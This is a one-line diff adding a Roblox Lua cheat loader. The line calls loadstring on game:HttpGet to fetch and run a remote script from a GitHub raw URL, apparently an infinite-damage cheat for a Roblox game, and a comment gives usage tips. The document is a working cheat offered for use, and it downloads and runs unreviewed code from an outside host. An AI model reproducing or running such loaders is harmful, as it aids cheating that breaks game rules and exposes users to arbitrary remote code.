@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hambourga/I-forgor-/main/InfDmg%20in%20undertale%20wave%20rush.lua"))() --if u change ur weapons execute it again and also u need to hold the weapons or its will not work
